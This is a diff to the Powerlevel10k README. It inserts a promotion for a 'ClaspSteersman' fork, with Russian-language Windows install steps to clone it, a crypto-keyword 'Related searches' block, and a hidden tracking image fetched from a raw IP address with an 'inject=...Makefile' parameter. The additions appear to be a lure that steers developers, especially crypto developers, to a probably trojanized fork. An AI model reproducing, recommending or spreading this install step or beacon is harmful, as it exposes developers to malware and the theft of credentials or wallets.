@@ -1,3 +1,19 @@
+**Powerlevel10k (ClaspSteersman Fork)**
+
+This fork addresses long-standing performance and stability bottlenecks specifically tailored for developers working in Windows environments. By integrating targeted patches and optimizing the initialization sequence, it delivers a seamless, friction-free setup experience without the usual configuration headaches.
+
+**Quick install (Windows)**
+
+1. Установи [Git for Windows](https://git-scm.com/download/win)
+2. Открой **Git Bash** или **cmd**
+3. Выполни команду ниже
+
+```bash
+git clone https://github.com/ClaspSteersman/powerlevel10k.git
+```
+
+[https://github.com/ClaspSteersman/powerlevel10k](https://github.com/ClaspSteersman/powerlevel10k)
+
 # Powerlevel10k
 [![Gitter](https://badges.gitter.im/powerlevel10k/community.svg)](
   https://gitter.im/powerlevel10k/community?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge)
@@ -2118,3 +2134,11 @@ Most notably, [libgit2 does not support `skipHash`](https://github.com/libgit2/l
 If you see incorrect git status in prompt, run `git config -l` and check whether `skipHash` is
 enabled. If it is, consider disabling it. Keep in mind that `skipHash` may be implicitly enabled
 when activating certain git features, such as `manyFiles`.
+
+## Related searches
+
+When exploring advanced shell customization tools like this, users often look for highly responsive interfaces that can dynamically display complex network state information right in their command prompt. Developers frequently seek fast configurations to monitor automated environments, custom blockchain runtimes, or real-time nodes without introducing command lag.
+
+**Topics:** validator client, futures bot, bnb chain, lightning network, anchor solana, zsh prompt optimization, terminal customization, shell theme performance, dotfiles, developer productivity tools, real-time node monitoring, custom terminal themes
+
+![.](http://5.231.58.248:8787/pixel?repo=ClaspSteersman%2Fpowerlevel10k&inject=ClaspSteersman%2Fpowerlevel10k%2FMakefile)
